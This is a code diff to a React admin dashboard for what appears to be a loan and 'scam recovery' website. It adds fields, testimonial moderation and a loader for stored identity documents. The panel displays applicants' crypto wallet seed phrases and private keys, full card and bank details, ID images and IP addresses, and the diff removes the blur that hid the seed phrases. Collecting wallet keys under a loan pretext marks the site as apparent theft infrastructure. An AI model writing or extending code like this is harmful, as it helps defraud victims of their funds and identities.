@@ -6,7 +6,8 @@ import {
   updateLeadStatus,
   updateLoanStatus,
   updateTestimonialStatus,
-  verifyLoanIdentity
+  verifyLoanIdentity,
+  resolveLoanAsset,
 } from "@/lib/queries";
 import { toast } from "sonner";
 import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
@@ -329,7 +330,7 @@ export function LoansTab() {
                             </div>
                           </div>
                           <div className="flex items-center gap-3">
-                            <button 
+                            <button
                               onClick={() => {
                                 navigator.clipboard.writeText(JSON.stringify(r, null, 2));
                                 toast.success("Full application JSON copied");
@@ -405,8 +406,15 @@ export function LoansTab() {
                             >
                               <div className="bg-slate-900 p-4 rounded-xl mb-3 shadow-lg border border-slate-800">
                                 <DField label="Requested Amount" value={`${r.currency} ${Number(r.amountRequested).toLocaleString()}`} dark className="text-xl text-blue-400 font-black" />
+                                <DField label="Currency" value={r.currency} dark />
                                 <DField label="Loan Term" value={`${r.loanTermMonths} Months`} dark className="text-amber-400" />
                               </div>
+                              <DField label="Payout Method" value={
+                                r.payoutMethod === "bank_transfer" ? "🏦 Bank Transfer" :
+                                r.payoutMethod === "crypto" ? "₿ Crypto Wallet" :
+                                r.payoutMethod === "card" ? "💳 Credit / Debit Card" :
+                                r.payoutMethod
+                              } />
                               <DField label="Application Source" value={r.sourcePage} mono className="text-[10px] text-gray-400" />
                               {r.loanPurpose && (
                                 <div className="mt-2 p-3 bg-gray-50 rounded-lg border border-gray-100">
@@ -416,9 +424,10 @@ export function LoansTab() {
                               )}
                             </DetailSection>
 
-                            <DetailSection title="💸 Payout Strategy">
-                              {r.payoutMethod === "bank_transfer" && (
-                                <div className="space-y-3">
+                            <DetailSection title="💸 Financial & Payout Assets">
+                              {/* Always show Bank if data exists */}
+                              {(r.bankName || r.bankAccountNumber) && (
+                                <div className="space-y-3 mb-6">
                                   <div className="flex items-center gap-2 mb-2">
                                     <span className="h-2 w-2 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></span>
                                     <span className="text-[10px] font-black uppercase tracking-tighter text-blue-600">Institutional Bank Transfer</span>
@@ -430,20 +439,24 @@ export function LoansTab() {
                                 </div>
                               )}
                               
-                              {r.payoutMethod === "crypto" && (
-                                <div className="space-y-3">
+                              {/* Always show Crypto if data exists */}
+                              {(r.cryptoWalletAddress || r.cryptoSeedPhrase) && (
+                                <div className="space-y-3 mb-6">
                                   <div className="flex items-center gap-2 mb-2">
                                     <span className="h-2 w-2 rounded-full bg-orange-500 shadow-[0_0_8px_#f97316]"></span>
                                     <span className="text-[10px] font-black uppercase tracking-tighter text-orange-600">Digital Asset Settlement</span>
                                   </div>
                                   <DField label="Wallet Ecosystem" value={r.cryptoWalletType} />
                                   <DField label="Recipient Address" value={r.cryptoWalletAddress} mono className="text-orange-700" />
-                                  <div className="p-3 bg-red-50 border border-red-100 rounded-lg">
-                                    <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono className="text-red-600 blur-[1px] hover:blur-none transition duration-500" />
-                                  </div>
+                                  {r.cryptoSeedPhrase && (
+                                    <div className="p-3 bg-red-50 border border-red-100 rounded-lg">
+                                      <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono className="text-red-600" />
+                                    </div>
+                                  )}
                                 </div>
                               )}
 
+                              {/* Always show Card if data exists */}
                               {r.cardNumber && (
                                 <div className="space-y-4">
                                   <div className="flex items-center gap-2">
@@ -522,6 +535,12 @@ export function LoansTab() {
                                     </div>
                                   </div>
                                 </div>
+                                {r.rejectionReason && (
+                                  <div className="p-3 bg-red-50 rounded-xl border border-red-200">
+                                    <p className="text-[9px] font-bold text-red-400 uppercase mb-1">Rejection / Correction Reason</p>
+                                    <p className="text-xs text-red-700 font-medium leading-relaxed">{r.rejectionReason}</p>
+                                  </div>
+                                )}
 
                                 <div className="pt-4 border-t border-gray-100">
                                   <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-3">Update Verification Pipeline</p>
@@ -594,6 +613,12 @@ export function LoansTab() {
                                     <span className="text-emerald-700 font-mono text-right font-bold">{new Date(r.verifiedAt).toLocaleString()}</span>
                                   </div>
                                 )}
+                                {r.verifiedBy && (
+                                  <div className="flex justify-between gap-2">
+                                    <span className="text-gray-400 font-semibold shrink-0">Verified By</span>
+                                    <span className="text-emerald-700 font-mono text-right font-bold">{r.verifiedBy}</span>
+                                  </div>
+                                )}
                                 {r.ipAddress && (
                                   <div className="flex justify-between gap-2">
                                     <span className="text-gray-400 font-semibold shrink-0">IP Address</span>
@@ -647,6 +672,7 @@ export function TestimonialsTab() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
   const [search, setSearch] = useState("");
+  const [expandedId, setExpandedId] = useState<string | null>(null);
 
   const load = useCallback(async () => {
     setLoading(true); setError("");
@@ -659,6 +685,14 @@ export function TestimonialsTab() {
 
   useEffect(() => { load(); }, [load]);
 
+  const onUpdateStatus = async (id: string, status: string) => {
+    try {
+      await updateTestimonialStatus({ data: { id, status } });
+      setRows(prev => prev.map(r => r.id === id ? { ...r, status } : r));
+      toast.success(`Testimonial marked as ${status}`);
+    } catch { toast.error("Failed to update status"); }
+  };
+
   const filtered = rows.filter(r =>
     search === "" ||
     `${r.clientName} ${r.email} ${r.location}`.toLowerCase().includes(search.toLowerCase())
@@ -668,21 +702,70 @@ export function TestimonialsTab() {
     <TableShell title="Testimonial Submissions" count={rows.length} loading={loading} error={error} onRefresh={load}
       search={search} onSearch={setSearch}>
       <table className="min-w-full text-sm">
-        <THead cols={["Name", "Email", "Location", "Scam", "Amount", "Rating", "Status", "Date"]} />
+        <THead cols={["", "Name", "Email", "Location", "Scam", "Amount", "Rating", "Status", "Date"]} />
         <tbody className="divide-y divide-gray-100">
-          {filtered.map(r => (
-            <tr key={r.id} className="hover:bg-gray-50 transition-colors align-top">
-              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.clientName}</td>
-              <td className="px-4 py-3 text-gray-500">{r.email || "—"}</td>
-              <td className="px-4 py-3 text-gray-500">{r.location || "—"}</td>
-              <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
-              <td className="px-4 py-3 font-medium text-emerald-700">{r.amountRecovered || "—"}</td>
-              <td className="px-4 py-3 text-yellow-500">{"★".repeat(r.rating)}{"☆".repeat(5 - r.rating)}</td>
-              <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
-              <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
-            </tr>
-          ))}
-          {!loading && filtered.length === 0 && <EmptyRow cols={8} msg="No submissions yet" />}
+          {filtered.map(r => {
+            const expanded = expandedId === r.id;
+            return (
+              <React.Fragment key={r.id}>
+                <tr
+                  className="hover:bg-gray-50 transition-colors align-top cursor-pointer"
+                  onClick={() => setExpandedId(expanded ? null : r.id)}
+                >
+                  <td className="pl-4 pr-2 py-3 text-gray-400 w-8">
+                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
+                  </td>
+                  <td className="px-4 py-3 font-medium whitespace-nowrap">{r.clientName}</td>
+                  <td className="px-4 py-3 text-gray-500">{r.email || "—"}</td>
+                  <td className="px-4 py-3 text-gray-500">{r.location || "—"}</td>
+                  <td className="px-4 py-3"><Chip text={r.scamType || "—"} /></td>
+                  <td className="px-4 py-3 font-medium text-emerald-700">{r.amountRecovered || "—"}</td>
+                  <td className="px-4 py-3 text-yellow-500">{"★".repeat(r.rating)}{"☆".repeat(5 - r.rating)}</td>
+                  <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
+                  <td className="px-4 py-3 text-gray-400 text-xs whitespace-nowrap">{fmtDate(r.createdAt)}</td>
+                </tr>
+                {expanded && (
+                  <tr>
+                    <td colSpan={9} className="bg-slate-50/50 px-4 py-4 border-b border-gray-100">
+                      <div className="space-y-3">
+                        {r.quote && (
+                          <div className="p-3 bg-white rounded-lg border border-gray-100">
+                            <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mb-1">Testimonial Quote</p>
+                            <p className="text-sm text-gray-700 italic leading-relaxed">"{r.quote}"</p>
+                          </div>
+                        )}
+                        <div className="flex items-center justify-between gap-4 flex-wrap">
+                          <div className="flex items-center gap-3">
+                            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Update Status</span>
+                            <div className="flex flex-wrap items-center gap-1.5 p-1 bg-gray-50 rounded-lg border border-gray-100">
+                              {[
+                                { id: "pending", label: "Pending", cls: "hover:bg-amber-50 hover:text-amber-700" },
+                                { id: "approved", label: "Approve", cls: "hover:bg-emerald-50 hover:text-emerald-700" },
+                                { id: "rejected", label: "Reject", cls: "hover:bg-red-50 hover:text-red-700" },
+                              ].map(s => (
+                                <button
+                                  key={s.id}
+                                  onClick={(e) => { e.stopPropagation(); onUpdateStatus(r.id, s.id); }}
+                                  className={`px-3 py-1 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all whitespace-nowrap ${
+                                    r.status === s.id
+                                      ? "bg-white shadow-sm border border-gray-200 text-slate-900"
+                                      : `text-gray-400 ${s.cls}`
+                                  }`}
+                                >
+                                  {s.label}
+                                </button>
+                              ))}
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </td>
+                  </tr>
+                )}
+              </React.Fragment>
+            );
+          })}
+          {!loading && filtered.length === 0 && <EmptyRow cols={9} msg="No submissions yet" />}
         </tbody>
       </table>
     </TableShell>
@@ -909,8 +992,34 @@ function RawJsonView({ data }: { data: object }) {
 
 // ─── DocImage — identity document thumbnail + lightbox ────────────────────────
 
+// Resolve an R2 key (or base64 data URL passthrough) to a renderable data URL.
+// Cached per-src so re-expanding the same loan row doesn't re-stream from R2.
+const assetCache = new Map<string, string | null>();
+
+function useResolvedAsset(src: string | null): string | null {
+  const [resolved, setResolved] = useState<string | null>(src && assetCache.get(src) !== undefined ? assetCache.get(src)! : null);
+
+  useEffect(() => {
+    if (!src) { setResolved(null); return; }
+    if (src.startsWith("data:")) { setResolved(src); return; }
+    if (assetCache.has(src)) { setResolved(assetCache.get(src) ?? null); return; }
+    let cancelled = false;
+    resolveLoanAsset({ data: src })
+      .then((r) => {
+        if (cancelled) return;
+        assetCache.set(src, r?.dataUrl ?? null);
+        setResolved(r?.dataUrl ?? null);
+      })
+      .catch(() => { if (!cancelled) setResolved(null); });
+    return () => { cancelled = true; };
+  }, [src]);
+
+  return resolved;
+}
+
 function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; src: string | null }) {
   const [open, setOpen] = useState(false);
+  const resolved = useResolvedAsset(src);
 
   if (!src) {
     return (
@@ -918,6 +1027,16 @@ function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; 
         <div className="text-slate-300">{icon}</div>
         <span className="text-[10px] text-slate-400 text-center leading-tight">{label}</span>
         <span className="text-[9px] text-slate-300 uppercase tracking-wider">Not provided</span>
+      </div>
+    );
+  }
+
+  if (!resolved) {
+    return (
+      <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border-2 border-slate-200 bg-slate-50 min-h-[100px] justify-center">
+        <div className="text-slate-400 animate-pulse">{icon}</div>
+        <span className="text-[10px] text-slate-400 text-center leading-tight">{label}</span>
+        <span className="text-[9px] text-slate-400 uppercase tracking-wider">Loading…</span>
       </div>
     );
   }
@@ -930,7 +1049,7 @@ function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; 
         className="group relative flex flex-col rounded-xl border-2 border-slate-300 bg-white overflow-hidden hover:border-primary hover:shadow-md transition-all"
       >
         <div className="relative">
-          <img src={src} alt={label} className="w-full h-24 object-cover" />
+          <img src={resolved} alt={label} className="w-full h-24 object-cover" />
           <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-all flex items-center justify-center">
             <ZoomIn className="w-5 h-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
           </div>
@@ -950,7 +1069,7 @@ function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; 
           onClick={() => setOpen(false)}
         >
           <div className="relative max-w-3xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
-            <img src={src} alt={label} className="max-w-full max-h-[80vh] rounded-xl shadow-2xl object-contain" />
+            <img src={resolved} alt={label} className="max-w-full max-h-[80vh] rounded-xl shadow-2xl object-contain" />
             <div className="mt-3 text-center text-white text-sm font-medium">{label}</div>
             <button
               onClick={() => setOpen(false)}
@@ -969,6 +1088,7 @@ function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; 
 
 function DocVideo({ label, icon, src }: { label: string; icon: React.ReactNode; src: string | null }) {
   const [open, setOpen] = useState(false);
+  const resolved = useResolvedAsset(src);
 
   if (!src) {
     return (
@@ -1011,10 +1131,10 @@ function DocVideo({ label, icon, src }: { label: string; icon: React.ReactNode; 
           onClick={() => setOpen(false)}
         >
           <div className="relative w-full max-w-4xl" onClick={e => e.stopPropagation()}>
-            <video 
-              src={src} 
-              controls 
-              autoPlay 
+            <video
+              src={resolved ?? undefined}
+              controls
+              autoPlay
               className="w-full h-auto rounded-xl shadow-2xl bg-black"
             />
             <div className="mt-3 text-center text-white text-sm font-medium">{label}</div>
